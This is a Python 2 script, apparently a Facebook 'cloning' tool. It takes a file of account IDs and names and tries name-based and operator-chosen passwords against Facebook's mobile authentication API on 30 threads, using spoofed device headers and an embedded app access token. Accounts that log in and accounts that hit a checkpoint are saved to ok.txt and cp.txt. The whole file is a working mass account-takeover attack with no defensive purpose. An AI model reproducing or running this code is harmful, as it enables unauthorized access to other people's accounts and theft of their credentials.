# coding: utf-8
# aahil writes


try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests lolcat")
	os.system("python2 mergan.py")


g='\x1b[1;92m'
r='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

logo ="""


##     ## ######## ########   ######      ###    ##    ## 
###   ### ##       ##     ## ##    ##    ## ##   ###   ## 
#### #### ##       ##     ## ##         ##   ##  ####  ## 
## ### ## ######   ########  ##   #### ##     ## ## ## ## 
##     ## ##       ##   ##   ##    ##  ######### ##  #### 
##     ## ##       ##    ##  ##    ##  ##     ## ##   ### 
##     ## ######## ##     ##  ######   ##     ## ##    ## 
=========================================================


"""

def sec():
    k=requests.get("https://raw.githubusercontent.com/Rana-Aahil/key/main/pass.txt").text
    os.system("clear")
    print logo
    x=raw_input("Enter Key : ")
    if x in k:
        main()
    else:
        print ("Wrong Key")
        time.sleep(2)
        sec()
def main():
    os.system('clear')
    print logo
    print ("[1] Cloning With Name + Pass")
    print ("[2] Cloning With Passwords")
    print ""
    m_s()
def m_s():
    m=raw_input("Choice Option : ")
    if m == "1":
        nam()
    elif m == "2":
        ps()
    else:
        print("Choice Valid Option")
        time.sleep(2)
        main()
def nam():
    cps=[]
    oks=[]
    idx=[]
    os.system("clear")
    print logo
    print ""
    pas1=raw_input("Name + Pass : ")
    pas2=raw_input("Name + Pass : ")
    pas3=raw_input("Name + Pass : ")
    pas4=raw_input("Name + Pass : ")
    print ""
    try:
        mf=raw_input('[!] Enter path : ')
        print ''
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        main()
    
    print "Total IDS : "+str(len(idx))
    print "----------------------------"
    print " Cloning Start Please Wsit"
    print "----------------------------"
    
    def main(arg):
        user=arg
        uid, name = user.split("|")
        first = name.rsplit(' ')[0]
        ses = requests.Session()
        ua=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint
        (20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        try:
            last=name.rsplit(' ')[1]
            pass1 = name
            send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass1)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
            if "session_key" in send.text and "EAAA" in send.text:
                print g + ("[AAHIL-OK] " +uid+ " | " +pass1)
                ok = open("ok.txt", "a")
                ok.write(uid+"|"+pass1+"\n")
                ok.close()
                oks.append(uid+pass1)
            elif "www.facebook.com" in send.json()["error_msg"]:
                print sm + ("[AAHIL-CP] " +uid+ " | " +pass1)
                cp = open("cp.txt", "a")
                cp.write(uid+"|"+pass1+"\n")
                cp.close()
                cps.append(uid+pass1)
            else:
                pass2 = first=pas1
                send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass2)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                if "session_key" in send.text and "EAAA" in send.text:
                    print g + ("[AAHIL-OK] " +uid+ " | " +pass2)
                    ok = open("ok.txt", "a")
                    ok.write(uid+"|"+pass2+"\n")
                    ok.close()
                    oks.append(uid+pass2)
                elif "www.facebook.com" in send.json()["error_msg"]:
                    print sm + ("[AAHIL-CP] " +uid+ " | " +pass2)
                    cp = open("cp.txt", "a")
                    cp.write(uid+"|"+pass2+"\n")
                    cp.close()
                    cps.append(uid+pass2)
                else:
                    pass3 = first+pas2
                    send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass3)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                    if "session_key" in send.text and "EAAA" in send.text:
                        print g + ("[AAHIL-OK] " +uid+ " | " +pass3)
                        ok = open("ok.txt", "a")
                        ok.write(uid+"|"+pass3+"\n")
                        ok.close()
                        oks.append(uid+pass3)
                    elif "www.facebook.com" in send.json()["error_msg"]:
                        print sm + ("[AAHIL-CP] " +uid+ " | " +pass3)
                        cp = open("cp.txt", "a")
                        cp.write(uid+"|"+pass3+"\n")
                        cp.close()
                        cps.append(uid+pass3)
                    else:
                        pass4 = first+pas3
                        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass4)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                        if "session_key" in send.text and "EAAA" in send.text:
                            print g + ("[AAHIL-OK] " +uid+ " | " +pass4)
                            ok = open("ok.txt", "a")
                            ok.write(uid+"|"+pass4+"\n")
                            ok.close()
                            oks.append(uid+pass4)
                        elif "www.facebook.com" in send.json()["error_msg"]:
                            print sm + ("[AAHIL-CP] " +uid+ " | " +pass4)
                            cp = open("cp.txt", "a")
                            cp.write(uid+"|"+pass4+"\n")
                            cp.close()
                            cps.append(uid+pass4)
                        else:
                            pass5 = first+pas4
                            send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass5)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                            if "session_key" in send.text and "EAAA" in send.text:
                                print g + ("[AAHIL-OK] " +uid+ " | " +pass5)
                                ok = open("ok.txt", "a")
                                ok.write(uid+"|"+pass5+"\n")
                                ok.close()
                                oks.append(uid+pass5)
                            elif "www.facebook.com" in send.json()["error_msg"]:
                                print sm + ("[AAHIL-CP] " +uid+ " | " +pass5)
                                cp = open("cp.txt", "a")
                                cp.write(uid+"|"+pass5+"\n")
                                cp.close()
                                cps.append(uid+pass5)
        except:
            pass
    print w
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    main()
    
    
def ps():
    cps=[]
    oks=[]
    idx=[]
    os.system("clear")
    print logo
    print ""
    pas1=raw_input("Password : ")
    pas2=raw_input("Password : ")
    pas3=raw_input("Password : ")
    pas4=raw_input("Password : ")
    print ""
    try:
        mf=raw_input('[!] Enter path : ')
        print ''
        for line in open(mf,'r').readlines():
            idx.append(line.strip())
    except:
        print ('file not found')
        time.sleep(2)
        main()
    print "Total IDS : "+str(len(idx))
    print "----------------------------"
    print " Cloning Start Please Wsit"
    print "----------------------------"
        
    def main(arg):
        user=arg
        uid, name = user.split("|")
        first = name.rsplit(' ')[0]
        ses = requests.Session()
        ua=("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
        headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint
        (20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
        try:
            pass1 = name
            send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass1)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
            if "session_key" in send.text and "EAAA" in send.text:
                print g + ("[AAHIL-OK] " +uid+ " | " +pass1)
                ok = open("ok.txt", "a")
                ok.write(uid+"|"+pass1+"\n")
                ok.close()
                oks.append(uid+pass1)
            elif "www.facebook.com" in send.json()["error_msg"]:
                print sm + ("[AAHIL-CP] " +uid+ " | " +pass1)
                cp = open("cp.txt", "a")
                cp.write(uid+"|"+pass1+"\n")
                cp.close()
                cps.append(uid+pass1)
            else:
                pass2 = pas1
                send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass2)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                if "session_key" in send.text and "EAAA" in send.text:
                    print g + ("[AAHIL-OK] " +uid+ " | " +pass2)
                    ok = open("ok.txt", "a")
                    ok.write(uid+"|"+pass2+"\n")
                    ok.close()
                    oks.append(uid+pass2)
                elif "www.facebook.com" in send.json()["error_msg"]:
                    print sm + ("[AAHIL-CP] " +uid+ " | " +pass2)
                    cp = open("cp.txt", "a")
                    cp.write(uid+"|"+pass2+"\n")
                    cp.close()
                    cps.append(uid+pass2)
                else:
                    pass3 = pas2
                    send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass3)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                    if "session_key" in send.text and "EAAA" in send.text:
                        print g + ("[AAHIL-OK] " +uid+ " | " +pass3)
                        ok = open("ok.txt", "a")
                        ok.write(uid+"|"+pass3+"\n")
                        ok.close()
                        oks.append(uid+pass3)
                    elif "www.facebook.com" in send.json()["error_msg"]:
                        print sm + ("[AAHIL-CP] " +uid+ " | " +pass3)
                        cp = open("cp.txt", "a")
                        cp.write(uid+"|"+pass3+"\n")
                        cp.close()
                        cps.append(uid+pass3)
                    else:
                        pass4 = pas3
                        send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass4)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                        if "session_key" in send.text and "EAAA" in send.text:
                            print g + ("[AAHIL-OK] " +uid+ " | " +pass4)
                            ok = open("ok.txt", "a")
                            ok.write(uid+"|"+pass4+"\n")
                            ok.close()
                            oks.append(uid+pass4)
                        elif "www.facebook.com" in send.json()["error_msg"]:
                            print sm + ("[AAHIL-CP] " +uid+ " | " +pass4)
                            cp = open("cp.txt", "a")
                            cp.write(uid+"|"+pass4+"\n")
                            cp.close()
                            cps.append(uid+pass4)
                        else:
                            pass5 = pas4
                            send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pass5)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                            if "session_key" in send.text and "EAAA" in send.text:
                                print g + ("[AAHIL-OK] " +uid+ " | " +pass5)
                                ok = open("ok.txt", "a")
                                ok.write(uid+"|"+pass5+"\n")
                                ok.close()
                                oks.append(uid+pass5)
                            elif "www.facebook.com" in send.json()["error_msg"]:
                                print sm + ("[AAHIL-CP] " +uid+ " | " +pass5)
                                cp = open("cp.txt", "a")
                                cp.write(uid+"|"+pass5+"\n")
                                cp.close()
                                cps.append(uid+pass5)
        except:
            pass
    
    p = ThreadPool(30)
    p.map(main, idx)
    print "\x1b[1;97m"
    print 39*'-'
    print "[!] cloning complete result ........"
    print 39*'-'
    print '[!] total ok ids : '+str(len(oks))
    print '[!] total cp ids : '+str(len(cps))
    print 39*'-'
    print ''
    raw_input(' Press enter to back ')
    main()

if __name__=='__main__':
    sec()
